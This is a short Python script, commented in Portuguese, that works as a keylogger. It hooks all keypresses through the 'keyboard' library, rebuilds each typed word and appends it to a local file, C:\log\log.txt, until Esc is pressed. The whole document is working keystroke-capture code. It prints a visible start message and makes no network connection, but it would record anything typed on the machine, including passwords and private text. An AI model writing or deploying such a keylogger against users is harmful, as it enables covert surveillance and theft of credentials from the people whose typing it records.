import keyboard
import os

# Caminho do arquivo de log
log_file_path = r"C:\log\log.txt"

# Verifica se o diretório existe, se não, cria o diretório
log_directory = os.path.dirname(log_file_path)
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

# Variável para armazenar a palavra atual
current_word = ""

# Função para registrar a palavra quando uma tecla de finalização é pressionada
def on_key_press(event):
    global current_word

    # Verifica se a tecla pressionada é uma tecla de finalização (espaço ou enter)
    if event.name == "space" or event.name == "enter":
        if current_word:  # Se houver uma palavra sendo digitada
            with open(log_file_path, "a") as f:
                f.write(f"Palavra digitada: {current_word}\n")
            current_word = ""  # Reseta a palavra atual
    elif event.name == "backspace":
        # Remove o último caractere da palavra atual
        current_word = current_word[:-1]
    else:
        # Adiciona a tecla pressionada à palavra atual (ignora teclas especiais)
        if len(event.name) == 1:  # Apenas caracteres simples (letras, números, etc.)
            current_word += event.name

# Registra a função para o evento de tecla pressionada
keyboard.on_press(on_key_press)

# Mensagem inicial
print("Capturando palavras. Pressione 'Esc' para sair.")

# Mantém o script em execução até que a tecla 'Esc' seja pressionada
keyboard.wait('esc')